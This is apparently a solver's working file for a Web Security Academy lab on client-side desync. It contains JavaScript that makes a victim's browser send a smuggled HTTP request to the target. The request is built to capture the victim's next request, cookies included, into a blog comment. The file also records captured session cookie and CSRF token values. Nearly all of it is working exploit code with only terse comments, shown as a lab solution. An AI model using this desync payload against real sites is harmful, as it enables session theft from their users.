fetch("0a640017041d4af78026031400500012.h1-web-security-academy.net/",{
    method: "POST",
    body: "GET /asdas HTTP/1.1\r\nX-Ignore: X",
    credentials: "include",  //ensures we  use the 'with-cookies' connection pool
    mode: "cors" //Will elicit an error, ensures we dont follow the 302 redirect.
}).catch(()=>{
    fetch("0a640017041d4af78026031400500012.h1-web-security-academy.net/",
        {
                mode: "no-cors",    //won't trigger an error.
            credentials: "include"
        }
    );
});


/*POST /en/post/comment HTTP/1.1
Host: 0a640017041d4af78026031400500012.h1-web-security-academy.net
Cookie: session=lQtABgw0RcR4jvkJs9tOVIY5k0chuyA7; _lab_analytics=OjW2K2o8ZwFdCLt4vM23Cd78ZGpUZx8Gl2mybBpzQ4GBkotZ3o82gJpdqS4qFfh2V9wMP0lAtEl8tXUNU7fymz3INwsng3JSivGPH4ehHiuMBGu5PsnD06PLkjjSY7fpIPCNfsdi0au4IEcoKrh5csWv7yVh9TlOlwl6tCpCrqaK6wehkdzsXD8hJ6yrgy763Lvj7isIS2zHYBx2qdypoowA79TzdJHOjpFYIE0WMpeKupM8LPVhVtajkppV14gy
Content-Length: 117
Content-Type: application/x-www-form-urlencoded
Connection: close

csrf=3WTvGeTJvfg6CIo3fBGe5cyUQl0fUxCQ&postId=4&name=demo&email=demo@demo.com&website=http://www.test.com&comment=demo */

Put in /*exploit server*/
<script>smuggledReq = [
"POST /en/post/comment HTTP/1.1",
"Host: 0a640017041d4af78026031400500012.h1-web-security-academy.net",
"Cookie: session=lQtABgw0RcR4jvkJs9tOVIY5k0chuyA7",
"Content-Length: 850",
"Content-Type: application/x-www-form-urlencoded",
"Connection: close",
"",
"csrf=3WTvGeTJvfg6CIo3fBGe5cyUQl0fUxCQ&postId=4&name=demo&email=demo@demo.com&website=http://www.test.com&comment=demoasd",
].join("\r\n");

fetch("https://0a640017041d4af78026031400500012.h1-web-security-academy.net/",{
    method: "POST",
    body: smuggledReq,
    credentials: "include",  //ensures we  use the 'with-cookies' connection pool
    mode: "cors" //Will elicit an error, ensures we dont follow the 302 redirect.
}).catch(()=>{
    fetch("https://0a640017041d4af78026031400500012.h1-web-security-academy.net/en",
        {
            mode: "no-cors",    //won't trigger an error.
            credentials: "include"
        }
    );
});</script>